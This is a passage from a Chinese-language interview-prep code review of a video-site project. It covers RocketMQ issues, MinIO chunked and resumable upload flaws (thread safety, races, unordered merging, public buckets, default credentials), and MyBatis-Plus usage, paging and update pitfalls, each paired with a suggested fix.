  7. **🟡 消费者并发度没调**：默认 `consumeThreadMax=20`，`MysqlToEsConsumer` 是 CONCURRENTLY 但只做 Redis 写入，并发高点无所谓；`VideoEncodeConsumer` 是**重 CPU**任务，20 个线程同时转码会**把机器 CPU 打满**，应该显式限制（`consumeThreadMax=2~4`）。
  8. **🟡 无消息轨迹（trace）**：RocketMQ 支持消息轨迹，开启后能看到「发送 → 存储 → 消费」全链路，配合 Sleuth 能补上 MQ 这一段断掉的调用链（Sleuth 默认无法跨 MQ 传递 traceId，除非手动在消息 header 里塞 `X-B3-TraceId`）。
  9. **🟡 单机部署无高可用**：`name-server: localhost:9876` 单节点，Broker 单 Master，**没有副本、没有主从**。生产至少 2 Master 2 Slave。
  10. **🟡 Topic 未预创建**：靠 `autoCreateTopicEnable` 自动建（生产环境应该关闭自动创建，改为运维预建，避免 Topic 名写错时静默创建新 topic 导致消息去了没人消费的地方）。

### 9.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **消费者吞异常 → 失败不重试** | `VideoEncodeConsumer:159`、`MysqlToEsConsumer:43` | 🔴 致命 | 抛异常交给 MQ 重试 |
| **生产端失败只打日志 → 静默丢失** | `SendNoticeServiceImpl:42` 等 5 处 | 🔴 致命 | 本地重试表 + 定时补偿 |
| **`ORDERLY` 与生产端不匹配，顺序性不成立** | `LikeConsumer:25` + `SendNoticeServiceImpl:51` | 🟠 高 | 生产端 `sendOrderly` + Selector |
| **无幂等，且通知表无唯一索引** | `01-schema.sql:147-173` | 🟠 高 | 加唯一索引兜底 |
| 无死信队列监控与告警 | 全部消费者 | 🟠 高 | DLQ 监控 + 人工兜底流程 |
| 无 Tag / Key | 5 个 topic | 🟡 中 | 加 Tag 过滤 + Key 便于排查 |
| 重 CPU 消费者并发未限制 | `VideoEncodeConsumer` | 🟡 中 | `consumeThreadMax` 显式设小 |
| 无消息轨迹/堆积监控 | 无配置 | 🟡 中 | 开 trace + consumerLag 告警 |
| 单 Master 无副本 | `application.yml` | 🟡 中 | 2M2S 部署 |
| `autoCreateTopicEnable` 未关 | Broker 默认 | 🟡 中 | 生产关闭，Topic 预建 |
| 未用事务消息，存在「落库成功但消息没发」 | `UploadAndEditServiceImpl:114-144` | 🟠 高 | 事务消息 / 本地消息表 |

---

## 第 10 章 MinIO —— 文件对象存储

### 10.1 在这个项目里它扮演什么角色

**一句话**：MinIO 是这个项目的**文件和视频仓库**，同时承载了**全项目技术含量最高的一条链路——分片上传 + 断点续传 + 合并**。

**Bucket 清单**

| Bucket | 内容 | 谁在写 |
|---|---|---|
| `video` | 视频文件（分片 + 合并后的成品 + 转码结果） | `MinioServiceImpl.uploadVideoFile` |
| `video-cover` | 视频封面（截帧图 + 用户上传的封面） | `MinioServiceImpl.uploadImgFile` |
| `user-cover` | 用户头像 | `user_center`（配置 `minio.bucket.name: user-cover`） |
| 聊天图片 | 文生图结果（**规划中，实际存的是 Base64**） | chat（见第 13 章） |

**配置**：`video/application.yml` → `minio.url: http://localhost:9000`、`access.name/secret: minioadmin/minioadmin`（**默认凭据，危险**）。

### 10.2 高分片上传与断点续传（**本章核心，务必讲透**）

#### 10.2.1 完整链路（对着代码讲）

**前端**（`vue` 里用 **Resumable.js**）：按 **6MB** 切片，每片带 `resumableIdentifier`（`name-size-lastModified`）、`resumableChunkNumber`、`resumableTotalChunks`。

**后端** `UploadAndEditServiceImpl.uploadPart()` 做四件事：

```java
// ① 首个分片到达时：抽第一帧当封面
//    第 297 行：uploadPartMap 里没有这个 identifier，或还没抽过封面
if (uploadPartMap.get(resumableIdentifier) == null || !...getHasCutImg()) {
    byte[] bytes = IoUtil.readBytes(uploadPartRequest.getFile().getInputStream());
    // 写到临时目录
    Files.copy(byteArrayInputStream, Paths.get(videoFile.getAbsolutePath()), REPLACE_EXISTING);
    // ★ 用 jave 的 ScreenExtractor 抽第 1000 毫秒处的一帧
    ScreenExtractor screenExtractor = new ScreenExtractor();
    MultimediaObject multimediaObject = new MultimediaObject(videoFile);
    screenExtractor.renderOneImage(multimediaObject, -1, -1, 1000, coverFile, 1);
    // 封面转 Base64 存在内存 map 里（不落 MinIO！）
    String cover = Base64.encode(IoUtil.readBytes(inputStream));
    uploadPart.setHasCutImg(true); uploadPart.setCover(cover);
    uploadPartMap.put(resumableIdentifier, uploadPart);
}

// ② 每个分片当【独立对象】上传到 MinIO
String name = resumableIdentifier + UUID.randomUUID().toString().substring(0, 10);
minioService.uploadVideoFile(name, uploadPartRequest.getFile().getInputStream(), "video/mp4");

// ③ 记录「分片号 → 对象名」的映射（存内存 Map）
newUploadPartMap.put(uploadPartRequest.getResumableChunkNumber(), name);
uploadPart.setPartMap(newUploadPartMap);
uploadPartMap.put(resumableIdentifier, uploadPart);
uploadPartMap.get(resumableIdentifier).setTotalCount(... + 1);   // ★ 计数器 +1

// ④ 分片齐了就合并
if (uploadPartMap.get(resumableIdentifier).getTotalCount().equals(uploadPartRequest.getResumableTotalChunks())) {
    videoName = resumableIdentifier + UUID.randomUUID().toString().substring(0, 10);
    videoCover = uploadPartMap.get(resumableIdentifier).getCover();
    minioService.composePart(resumableIdentifier, videoName);      // ★ composeObject 合并
}
```

**合并实现**（`MinioServiceImpl.composePart`）：

```java
List<ComposeSource> composeSourceList = new ArrayList<>();
for (Map.Entry<Integer,String> entry : uploadPartMap.get(resumableIdentifier).getPartMap().entrySet()) {
    composeSourceList.add(ComposeSource.builder().bucket("video").object(entry.getValue()).build());
}
minioClient.composeObject(ComposeObjectArgs.builder()
        .sources(composeSourceList).object(name).bucket("video").build());
```

**断点续传实现**：`getProcessor(resumableIdentifier, resumableChunkNumber)`
```java
// 遍历内存 map 里已上传的分片号，命中就返回 200（前端跳过该分片）
for (Map.Entry<Integer,String> entry : ...getPartMap().entrySet()) {
    if (entry.getKey().intValue() == resumableChunkNumber.intValue()) {
        return ResponseEntity.ok(Result.data(true));   // 已上传
    }
}
return ResponseEntity.noContent().build();             // 未上传，需要传
```
前端 `Resumable.js` 上传前先 `testTarget` 请求这个接口，**200 就跳过，204 就上传**——这就是断点续传的工作机制。

#### 10.2.2 关键问答

**Q1 [必答] 为什么要分片上传？**

- **答**：
  1. **突破单次请求大小限制**：`video/application.yml` 里 `max-file-size: 150MB`、`max-request-size: 350MB`，一个 2GB 的视频**根本传不上来**。分片后每次只传 6MB。
  2. **断点续传**：网络中断后**不用从头再来**。移动端/弱网环境下这是刚需。
  3. **上传进度可见**：前端能按分片数算百分比（`Resumable.js` 的 `file.progress()`）。
  4. **并发上传提速**：多个分片可以并行发（`Resumable.js` 的 `simultaneousUploads`）。
  5. **失败重试成本低**：只需要重传失败的那一片。

**Q2 [必答] 你这个分片上传和 MinIO/S3 的官方分片上传有什么区别？**

- **考点**：**这题是本章的分水岭，答出来说明你真的懂 S3 语义。**

- **答**：
  - **MinIO/S3 官方的 Multipart Upload**（我的实现**没有用**）：
    ```
    1. CreateMultipartUpload  → 返回一个 uploadId
    2. UploadPart(uploadId, partNumber, data) → 每片返回一个 ETag
    3. CompleteMultipartUpload(uploadId, [{partNumber, ETag}...])   ← 要提交 ETag 清单
    4. （或 AbortMultipartUpload 放弃）
    ```
    - **特点**：`uploadId` 是**服务端下发的**，ETag 由服务端返回，**合并时要把 ETag 列表提交上去**，MinIO 内部完成拼接（**不产生中间对象**，也不占用额外空间）。分片大小要求：**除最后一片外每片 ≥ 5MB**，最多 10000 片。
  - **我的实现**（**自研方案**）：
    - 每个分片用 `putObject` 当成**独立完整对象**上传（对象名 = `identifier + UUID`）；
    - 靠**内存 Map**（`Constant.uploadPartMap`）记录「分片号 → 对象名」；
    - 最后用 **`composeObject`** 把这些**独立对象拼接**成一个新对象。
  - **两者的本质差别**（**这是最该讲的部分**）：
    | 维度 | S3 官方 Multipart | 我的 composeObject 方案 |
    |---|---|---|
    | 中间产物 | **无**（服务端内部合并） | **每个分片都是一个永久对象**，合并后**没删** → **存储翻倍** |
    | 分片标识 | 服务端下发 `uploadId` | 前端生成 `resumableIdentifier` |
    | 合并依据 | ETag 清单（**服务端校验完整性**） | 客户端分片号（**服务端不校验**，缺片也能"合并成功"） |
    | 断点续传 | `ListParts` 查已传分片（**服务端权威**） | 查自己的内存 Map（**进程重启即失效**） |
    | 分片大小上限 | 10000 片 | `composeObject` 最多 **10000 个 source** |
    | 分片大小下限 | ≥ 5MB（除最后一片） | **MinIO 的 composeObject 同样要求 source 除最后一个外 ≥ 5MB** |
  - **⚠️ 我的方案因此有三个硬伤**：
    1. **存储翻倍**：`composeObject` 完成后**没有删除原始分片对象**（`composePart` 里没有 `removeObject` 调用），所以 MinIO 里长期存着**分片 + 成品两份数据**。一个 100MB 视频占 200MB。
    2. **"合并成功"不代表文件完整**：我的完成条件只是 **`totalCount == resumableTotalChunks`**（一个**计数器**），**没有校验实际分片是否齐全**。如果第 2 片上传失败但计数被加了两次，或者并发导致计数错乱，就会**用缺失的分片合并出一个损坏的视频，而且服务端认为成功了**。S3 官方方案提交 ETag 清单时，服务端会校验每个分片存在，**这是完整性保证的关键**。
    3. **断点续传实际不可用**：`uploadPartMap` 是**静态内存 Map**（`Constant.java:29` `public static Map<String, UploadPart> uploadPartMap = new HashMap<>();`）。服务一重启，"哪些片已传"就**全丢了**，用户续传时会**从头重传**；多实例部署时请求落到不同实例，续传状态对不上。真正的断点续传应该把分片状态**存 Redis/DB**，或者**用 MinIO 的 `ListParts` 查询服务端真实状态**。
  - **正确做法**：
    ```java
    // 用 MinIO 官方分片 API（Java SDK 8.x 提供）
    String uploadId = minioClient.createMultipartUpload(...);   // 或走 S3 API
    // 或用 S3 SDK 的 TransferManager，它自动分片 + 并发 + 断点续传
    ```
    如果坚持用 `composeObject`（它在「把已有多个对象拼成一个」这个场景下是合理的，比如 HLS 切片合并），也**必须补三件事**：① 合并成功后 `removeObject` 删除所有分片；② 合并前校验分片数量与编号连续性；③ 分片状态外置到 Redis。

**Q3 [深挖] `uploadPartMap` 用静态 `HashMap` 有什么问题？**

- **考点**：**并发 + 内存 + 持久化三重问题，答全了很加分。**

- **答**：
  ```java
  // video/constant/Constant.java:29
  public static Map<String, UploadPart> uploadPartMap = new HashMap<>();   // ← 非线程安全！
  ```
  1. **🔴 线程不安全**：`HashMap` 在**并发 put 时可能丢数据甚至死循环**（JDK 7 的头插法扩容死循环，JDK 8 改为尾插法但仍会丢数据）。而视频分片上传**天然是并发的**（前端 `simultaneousUploads` 可以同时传多片），所以**多个请求同时 `put` 到同一个 HashMap 会丢分片**。丢分片的后果是：`totalCount` 可能凑够（因为计数和 map 写入是两步非原子操作），合并时少了分片 → **视频损坏**。**必须换成 `ConcurrentHashMap`**（同一个文件里 `Constant.map` 上面就用了 `ConcurrentHashMap`，说明知道有这个类，这里属于疏漏）。
  2. **🔴 `totalCount` 的读-改-写非原子**：
     ```java
     uploadPartMap.get(id).setTotalCount(uploadPartMap.get(id).getTotalCount() + 1);   // ← 竞态
     ```
     两个线程同时读到 5，都写回 6 —— **计数少加了一次**，那么 `totalCount == totalChunks` **永远不会成立，文件永远不会被合并**（表现为「上传卡在 99%」）。应该用 `AtomicInteger` 或 `ConcurrentHashMap.merge()`。
  3. **🔴 内存泄漏**：`uploadPartMap` 的条目**从来没有被清理**（合并完成后没有 `remove`）。每个条目里还存着**封面图的 Base64 字符串**（`uploadPart.setCover(cover)`，一张 1920×1080 的 JPEG Base64 大概几百 KB 到 MB 级）。上传几个视频后堆内存就明显上涨，**长期运行必然 OOM**。
  4. **🔴 多实例不共享**：video 服务扩容到 2 个副本时，分片 1 打到实例 A、分片 2 打到实例 B，**两个实例各记一半，永远凑不齐**。所以这个方案**无法水平扩容**。
  5. **🟠 重启即失忆**：见 Q2 第 3 点。
  6. **🟡 封面也存内存**：`cover` 是 Base64 存在内存里等合并完成才返回前端，**为什么不在第一个分片抽帧后直接传到 MinIO 的 `video-cover` bucket？** 这样既省内存，也不怕重启丢封面。这是个明显该改的设计。
  - **正确设计**（讲这个能体现工程能力）：
    ```java
    // 用 Redis Hash 存分片状态，天然支持多实例 + 重启恢复 + TTL 自动清理
    // key:  upload:part:{identifier}
    // field: 分片号   value: MinIO 对象名
    redis.opsForHash().put("upload:part:" + identifier, String.valueOf(chunkNumber), objectName);
    redis.expire("upload:part:" + identifier, 24, TimeUnit.HOURS);   // ★ TTL 防泄漏
    // 判断是否齐了用 HLEN 比较
    Long uploaded = redis.opsForHash().size("upload:part:" + identifier);
    if (uploaded >= totalChunks) { 合并; redis.delete(key); }
    ```
    或者**直接复用 MinIO 的官方分片能力**（`ListParts` 就是服务端的权威状态），**根本上不需要自己维护状态**。

**Q4 [进阶] `composeObject` 有什么限制？**

- **答**：
  1. **分片大小下限**：除**最后一个** source 外，每个 source **必须 ≥ 5MB**（S3/MinIO 的硬性约束）。这就是为什么前端 `Resumable.js` 的切片大小要设成 **6MB**——如果设成 1MB，`composeObject` 会直接报 `EntityTooSmall` 错误。
     - **这也解释了后端那个 `putObject(...stream(stream, -1, 10485760))` 里的 `10485760`**：`PutObjectArgs.stream(stream, objectSize, partSize)` 的第三个参数是**单次上传的分片大小（10MB）**，是 S3 客户端内部的传输分片，**和业务分片无关**（很多人会混淆这两个概念，面试时能区分开是加分项）。
  2. **source 数量上限**：`composeObject` 最多 **10000 个 source**（和 S3 分片上限一致）。按 6MB 算，**最大支持 60GB** 的单文件。超过就要分层合并（先合成几组，再合成最终文件）。
  3. **`-1` 表示"未知大小"**：`stream(stream, -1, 10485760)` 里的 `-1` 是 objectSize 未知，MinIO 客户端会用 multipart 方式上传，**内存占用可控**（不会把整个流读进内存）。这是对的写法。
  4. **不校验一致性，且 source 顺序完全依赖不保证的 Map 遍历顺序**：`composeObject` **不校验 source 的顺序和完整性**——它严格按你给的 `sources` 列表顺序拼接。**列表顺序错了，合并出来的视频就是乱的。**
     - **⚠️ 这里有一个真实的隐患**：`composePart` 遍历的是 `uploadPartMap.get(id).getPartMap()`，而它的类型是 **`Map<Integer, String> partMap = new HashMap<>()`**（`UploadPart.java:11`）——**`HashMap` 的迭代顺序由「哈希桶顺序 + 插入历史 + 扩容历史」共同决定，规范上不保证任何顺序**。
     - **它现在「碰巧」通常是对的**：`Integer` 的 `hashCode` 就是它自己的值，默认容量 16 时桶下标为 `key & 15`，分片号 1~16 恰好落在 1~16 号桶，**小整数场景下迭代顺序与插入顺序一致**，所以少片上传时看不出问题。
     - **但这是巧合，不是保证**：分片数超过 16 触发扩容（容量 32 → `key & 31`，仍然有序，继续侥幸）；**真正的风险来自并发乱序插入**——`Resumable.js` 并发上传时，如果第 5 片先于第 1 片到达并插入，`HashMap` 的链表/树化结构会让迭代顺序偏离自然顺序；一旦发生，**用户拿到的是一个分片错位的损坏视频，而服务端全程没有任何报错**。
     - **正确做法**：显式排序，把「碰巧对」变成「保证对」（一行代码）：
       ```java
       uploadPartMap.get(id).getPartMap().entrySet().stream()
           .sorted(Map.Entry.comparingByKey())     // ★ 按分片号排序
           .forEach(e -> composeSourceList.add(
               ComposeSource.builder().bucket("video").object(e.getValue()).build()));
       ```
     - **面试时怎么讲这个点**：不要说「这里有个必现的 bug」（它不一定必现，被追问会站不住），要说：**「这里依赖了 `HashMap` 的迭代顺序，而 `HashMap` 不保证顺序。小数据量下因为 `Integer.hashCode` 等于自身、桶下标与键值同序，所以碰巧正确；但这是实现细节不是规范保证，并发乱序插入或数据量变化都可能暴露。修法是一行 `sorted(comparingByKey())`，成本极低，应该修。」** 这样讲既准确又体现了「不依赖未定义行为」的工程素养。

**Q5 [进阶] 文件访问 URL 是怎么给的？安全吗？**

- **答**：
  - **现状**：后端把**拼接好的绝对 URL** 写进数据库：
    ```java
    // UploadAndEditServiceImpl:86-100
    @Value("${minio.file-path:http://localhost:9000/}")
    private String minioFilePath;
    String url = minioFilePath + "video/" + uploadVideoRequest.getUrl();
    video.setUrl(url);                                   // 存进 video.url
    String prefixPath = minioFilePath + "video-cover/";
    video.setCover(prefixPath + coverFileName);          // 存进 video.cover
    ```
    前端直接 `<video :src="video.url">` / `<img :src="video.cover">` 使用。
  - **这意味着**：前端**直连 MinIO 的 9000 端口**，也就是 **bucket 必须对匿名用户开放读权限**（否则 `<img>` 会 403）。**公开可读的 bucket 意味着任何知道 URL 的人都能下载/盗链你的视频**——视频站最怕的就是这个。
  - **三个具体问题**：
    1. **🔴 无鉴权、无防盗链**：URL 一旦泄露（分享、爬虫、日志），永久可访问。没有 Referer 校验、没有签名、没有有效期。
    2. **🔴 环境耦合**：URL **被持久化到了数据库**。本地开发存 `http://localhost:9000/...`，容器化后要改成 `http://minio:9000/...`，线上是 `https://labilibili.com/...` —— **同一份数据在不同环境下的含义不同**，迁移环境时**必须批量 UPDATE 数据库**。项目里那些 `FIX-13/FIX-14` 的注释（`@Value("${minio.file-path:...}")` 就是为了解决这个问题打的补丁）**都是这个设计缺陷的症状**。
    3. **🟠 端口暴露**：让浏览器直连对象存储的 S3 端口，既不好做统一入口/HTTPS，也不好做 CDN。
  - **正确做法**：
    | 方案 | 说明 | 适用 |
    |---|---|---|
    | **数据库只存 key** | 存 `video/abc123.mp4`，返回给前端时**动态拼 URL** | **必须做，成本最低** |
    | **预签名 URL（Presigned URL）** | `minioClient.getPresignedObjectUrl(...)`，带有效期（如 1 小时） | 私有内容、下载、上传 |
    | **CDN + 回源鉴权** | URL 带时间戳 + 签名，CDN 校验后回源 | 公开视频（**B 站这类大流量场景的标配**） |
    | **Nginx 反代 + Referer 校验** | 项目里已经有一部分（`docker` 里前端 nginx 把 `/video/` 反代到 MinIO） | 中等规模 |
  - **加分句**：**「对象存储的正确用法是『数据库存 key，URL 在返回时生成』。把 URL 持久化会把存储层的位置耦合进业务数据，环境迁移和 CDN 切换都会变成数据迁移。」**

**Q6 [深挖] `MinioConfig` 有什么问题？**

- **答**：
  ```java
  @Bean
  public MinioClient minioClient() {
      try {
          return MinioClient.builder().endpoint(endpoint).credentials(accessKey, secretKey).build();
      } catch (Exception e) {
          e.printStackTrace();
      }
      return null;            // ← 🔴 返回 null！
  }
  ```
  1. **🔴 构建失败返回 `null`**：`MinioClient.builder().build()` **几乎不会抛异常**（它只是拼配置，不发起连接），所以这里的 try/catch 基本是无效防御；而一旦真的抛异常，**返回 null 注册进 Spring 容器**，后续所有 `minioClient.xxx()` 调用全部 **NPE**，且错误现场离根因很远（排查困难）。**正确做法：抛异常终止启动（fail-fast）**，配置错误就不该让服务起来。
  2. **🔴 硬编码默认凭据**：`access.name: minioadmin` / `access.secret: minioadmin` 是 MinIO 的**出厂默认账号密码**，写在 yml 里进了 Git。生产必须换强密码 + 用环境变量/密钥管理服务注入。
  3. **🟠 桶从不创建**：`MinioServiceImpl` 里**定义了 `createBucket()` 方法但没有任何地方调用它**。桶是**靠人工在 MinIO 控制台建的**（或者靠 `docker` 初始化脚本）。这是**环境依赖没固化**——新环境部署时如果忘了建桶，上传就报 `NoSuchBucket`。正确做法是用 `ApplicationRunner` 启动时**幂等地检查并创建**（`bucketExists` → 不存在则 `makeBucket` + 设置策略）。
  4. **🟡 只有一个 `MinioClient` Bean 但 bucket 名硬编码在方法里**：`uploadVideoFile` 写死 `bucket("video")`，`uploadImgFile` 写死 `bucket("video-cover")`。应该提取成配置项或常量类，避免散落的字符串。
  5. **🟡 没有分片上传的桶策略设置**：如果需要匿名读（当前设计需要），应该显式用 `setBucketPolicy` 声明，而不是靠控制台手点。**显式声明才可审计。**

### 10.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **`uploadPartMap` 用非线程安全 HashMap** | `video/constant/Constant.java:29` | 🔴 致命 | `ConcurrentHashMap` |
| **`totalCount` 读-改-写竞态，可能永不合并** | `UploadAndEditServiceImpl:333` | 🔴 致命 | `AtomicInteger` / `merge()` |
| **依赖 `HashMap` 迭代顺序拼接分片（碰巧对，非保证）** | `MinioServiceImpl.composePart:39` + `UploadPart.java:11` | 🟠 高 | 按分片号 `sorted()` 后构造 sources |
| **合并后不删分片对象 → 存储翻倍** | `MinioServiceImpl.composePart:42` | 🔴 致命 | 合并后 `removeObject` 所有分片 |
| **上传状态存内存 → 多实例/重启失效** | `Constant.uploadPartMap` | 🔴 致命 | Redis Hash 或 MinIO `ListParts` |
| **内存泄漏（条目不清 + 封面 Base64 常驻）** | `Constant.uploadPartMap` | 🟠 高 | TTL 清理 + 封面直传 MinIO |
| **完成条件只有计数器，不校验分片完整性** | `UploadAndEditServiceImpl:334` | 🟠 高 | 校验编号连续 + 数量一致 |
| **URL 持久化进 DB，环境强耦合** | `UploadAndEditServiceImpl:86-100` | 🟠 高 | DB 只存 key |
| **Bucket 匿名可读，无防盗链** | 全链路 | 🟠 高 | 预签名 URL / CDN 鉴权 |
| 默认凭据 `minioadmin` 进 Git | `video/application.yml` | 🟠 高 | 强密码 + 环境变量 |
| `MinioConfig` 异常返回 null | `MinioConfig:25-28` | 🟡 中 | fail-fast 抛异常 |
| 桶靠人工创建，未固化 | `createBucket` 无调用者 | 🟡 中 | `ApplicationRunner` 幂等创建 |
| `@Transactional` 因 catch 吞异常而失效 | `UploadAndEditServiceImpl:93,154` | 🟠 高 | 见第 11 章 Q5 |

---

## 第 11 章 MyBatis-Plus —— 便捷执行单表增删改查

### 11.1 在这个项目里它扮演什么角色

**一句话**：MyBatis-Plus 是这个项目的**数据访问层主力**，承担了**约 90% 的数据库操作**——所有单表 CRUD 都由它完成，覆盖 20 张表、20 个 Mapper。

**核心用法落点**

| 能力 | 项目中的用法 | 源码示例 |
|---|---|---|
| **实体映射** | `@TableName` / `@TableId` / `@TableField` | `Video.java`、`VideoData.java`（20 个实体） |
| **通用 Mapper** | `interface UserMapper extends BaseMapper<User>` | `java/common/mapper/**`（20 个） |
| **条件构造器** | `LambdaQueryWrapper` / `LambdaUpdateWrapper` | 遍布所有 `*ServiceImpl` |
| **自动填充** | `MetaObjectHandler` 实现类 | `common/handler/MyMetaObjectHandler.java` |
| **主键策略** | `@TableId(type = IdType.AUTO)` | 所有实体的 `id` |
| **MPJ 多表** | `MPJLambdaWrapper` + `selectJoinOne/List/Count` | 见第 12 章 |

**自动填充（这是 MyBatis-Plus 在本项目最有价值的用法）**

```java
// common/handler/MyMetaObjectHandler.java
@Override
public void insertFill(MetaObject metaObject) {
    this.setFieldValByName("nickname", "新用户" + UUID.randomUUID().toString().substring(0,10), metaObject);
    this.setFieldValByName("createTime", LocalDateTime.now(), metaObject);
    this.setFieldValByName("danmakuCount", 0, metaObject);
    this.setFieldValByName("playCount", 0, metaObject);
    this.setFieldValByName("likeCount", 0, metaObject);
    this.setFieldValByName("collectCount", 0, metaObject);
    this.setFieldValByName("commentCount", 0, metaObject);
    this.setFieldValByName("status", 0, metaObject);
    // ...
}
@Override
public void updateFill(MetaObject metaObject) {
    this.setFieldValByName("updateTime", LocalDateTime.now(), metaObject);
}
```
配合实体上的 `@TableField(value = "create_time", fill = FieldFill.INSERT)`，**插入时自动补创建时间和各种计数的默认值**，业务代码里一句 `new VideoData().setVideoId(id)` 就够了。

### 11.2 高频问答

**Q1 [必答] 为什么用 MyBatis-Plus 而不是 JPA / 原生 MyBatis？**

- **答**（三段）：
  - **① 项目里解决什么**：这个项目**单表操作占绝大多数**——用户信息 CRUD、点赞/收藏/弹幕/播放记录都是标准单表增删改查。MyBatis-Plus 的 `BaseMapper` 让这些操作**零 SQL**（`userMapper.selectById(id)`、`likeMapper.insert(entity)`、`delete(wrapper)`），条件构造器 `LambdaQueryWrapper` 还能**编译期校验字段名**（`Video::getUserId` 而不是 `"user_id"` 字符串，重构时不会漏）。
  - **② 为什么不是别的**：
    | 维度 | MyBatis-Plus | JPA / Hibernate | 原生 MyBatis |
    |---|---|---|---|
    | 单表 CRUD | **零 SQL，开箱即用** | 零 SQL | **每张表都要手写 XML** |
    | SQL 可控性 | 高（可随时写自定义 SQL） | **低（自动生成，复杂查询难控）** | 最高 |
    | 学习成本 | 低（会 MyBatis 就会） | 高（JPQL、级联、脏检查、N+1 一堆坑） | 低 |
    | 分页 | **内置 `PaginationInnerInterceptor`** | `Pageable` | 手写 |
    | 性能问题 | 可预测 | **N+1、懒加载、脏检查易踩** | 可预测 |
    | 国内生态 | **主流** | 国外主流 | 主流 |
    
    **选它的实在理由**：① 我要的是「**单表快、多表可控**」——MyBatis-Plus 做单表、需要复杂 join 时写自定义 SQL（我项目里 `VideoServiceMapper` 就是手写 `@Select`），这个组合最灵活；② JPA 的**脏检查和级联**在微服务里很容易引起意外的全量更新和 N+1 查询，排查成本高；③ 团队和招聘市场熟悉度最高。
  - **③ 代价**：MyBatis 的「手写 SQL」优势在**多表场景**反而成了负担——复杂 join 要么手写 SQL（不可复用、易漏字段），要么引 MyBatis-Plus-Join（我引入了，见第 12 章）。而且**MyBatis-Plus 的 `updateById` 是「全字段更新」**，如果实体里有 null 字段会被一起写 null（我项目里踩过这个，见 Q4）。

**Q2 [必答] `LambdaQueryWrapper` 和 `QueryWrapper` 有什么区别？为什么用前者？**

- **答**：
  ```java
  // QueryWrapper：字符串字段名，运行期才知道写错
  new QueryWrapper<Video>().eq("user_id", userId);
  
  // LambdaQueryWrapper：方法引用，编译期就能发现写错
  new LambdaQueryWrapper<Video>().eq(Video::getUserId, userId);
  ```
  - **`LambdaQueryWrapper` 的三个优势**：
    1. **编译期类型安全**：字段名写错编译不过，而不是运行时报 `Unknown column`；
    2. **支持重构**：实体字段改名，IDE 重命名会同步改所有引用；
    3. **不需要记数据库列名**：写 `Video::getUserId` 即可，`@TableField("user_id")` 的映射由框架处理。
  - **实现原理**：`Video::getUserId` 是一个 `SerializedLambda`，MyBatis-Plus 通过 `LambdaUtils` 反射解析出方法名 `getUserId`，再按「`get` 去掉 + 首字母小写」推出属性名 `userId`，最后查 `TableInfo` 拿到对应的列名 `user_id`。
  - **项目实证**：项目里**绝大多数**都用 `LambdaQueryWrapper`（如 `PlayServiceImpl:61-63`、`LikeServiceImpl:49-57`、`GetNoticeServiceImpl:50-74`），只有少数几处用 `QueryWrapper`，这个习惯是对的。
  - **⚠️ 一个性能细节**：`LambdaQueryWrapper` 每次都要走反射解析 `SerializedLambda`，**比字符串写法略慢**。MyBatis-Plus 3.4+ 内部做了**缓存**（`LambdaUtils` 里的 `COLUMN_CACHE_MAP`），所以这个开销可以忽略。**能说出「有反射开销但被缓存了」是加分项。**

**Q3 [进阶] 分页是怎么实现的？**

- **答**（**诚实 + 正确做法**）：
  - **MyBatis-Plus 的标准做法**：
    ```java
    @Configuration
    public class MybatisPlusConfig {
        @Bean
        public MybatisPlusInterceptor mybatisPlusInterceptor() {
            MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
            interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));
            return interceptor;
        }
    }
    // 使用
    Page<Video> page = videoMapper.selectPage(new Page<>(1, 10), wrapper);
    ```
    原理：`PaginationInnerInterceptor` 是 MyBatis 的插件（`Interceptor`），拦截 `StatementHandler.prepare()`，在 SQL 执行前**改写 SQL 拼上 `LIMIT ?`**，并额外执行一次 `COUNT(*)` 查总数（会做优化：如果 SQL 里没有 group by/distinct，会把 `select a,b,c` 换成 `select count(*)`）。
  - **⚠️ 我项目里的现状**：**根本没有配 `MybatisPlusInterceptor`，也没用过 `Page`！** 全项目的分页都是**手写 `LIMIT`**：
    ```java
    // VideoServiceMapper.getFirstPageVideo
    @Select("SELECT ... FROM video v LEFT JOIN ... ORDER BY v.id DESC limit #{count},12")
    List<FirstPageVideoResponse> getFirstPageVideo(Integer count);
    
    // 调用方传入的是 pageIndex*12 这种偏移量
    // PlayServiceImpl:134
    List<FirstPageVideoResponse> responses = videoServiceMapper.getFirstPageVideo(count - 1);
    ```
    - **问题一**：`limit #{count},12` 里的 `count` 是**偏移量**（`count-1`），语义混乱（`getFirstPageVideo(count-1)` 这个 `-1` 完全看不懂在干什么）；
    - **问题二**：**没有 `COUNT` 查询**，所以无法返回总页数，前端做不了标准分页器，只能无限滚动；
    - **问题三**：**深分页性能问题**——`LIMIT 100000, 12` 需要扫描并丢弃 10 万行，越翻越慢。正确做法是**游标分页**（`WHERE id < 上一页最后一个 id ORDER BY id DESC LIMIT 12`），用主键/索引做游标。
    - **问题四**：`12` 是**魔法数字**硬编码在 SQL 里（`Constant.LIMIT = "12"` 定义了却没用上——**定义了常量却不引用，是典型的半成品重构**）。
  - **正确做法**：引 `PaginationInnerInterceptor`，把 `limit` 交给插件，并给 `size` 加上限（`setMaxLimit(100L)`）防止 `size=100000` 打挂数据库。

**Q4 [深挖] `updateById` 有什么坑？项目里踩过吗？**

- **考点**：**这题很实用，是 MyBatis-Plus 最常见的生产事故来源。**

- **答**：
  - **坑的本质**：`updateById(entity)` 生成的是 **`UPDATE table SET col1=?, col2=?, ... WHERE id=?`**——**对实体里所有非 null 字段都赋值**（默认 `FieldStrategy.NOT_NULL`）。所以：
    ```java
    // 目的是「只改封面」
    Video v = new Video().setId(1L).setCover("new.jpg");
    videoMapper.updateById(v);       // ✅ 只有 cover 被更新，因为其他字段是 null
    ```
    **这看起来没问题**——但陷阱在于**如果实体是从数据库查出来再改的**：
    ```java
    Video v = videoMapper.selectById(1L);   // 所有字段都有值
    v.setCover("new.jpg");
    videoMapper.updateById(v);              // ⚠️ 会把当时的 name/intro/url/... 全部重写一遍
    ```
    并发场景下：**线程 A 查到 name="旧名"，线程 B 把 name 改成"新名"，A 再 `updateById` 就把 name 覆盖回"旧名"了**——这是**丢失更新（lost update）**，典型的乐观锁问题。
  - **正确做法**（三种）：
    1. **用 `LambdaUpdateWrapper` 只 set 要改的字段**（**我项目里 `ChatServiceImpl.changeChatStatus`、`changeChatSessionTime` 就是这么做的，这是对的**）：
       ```java
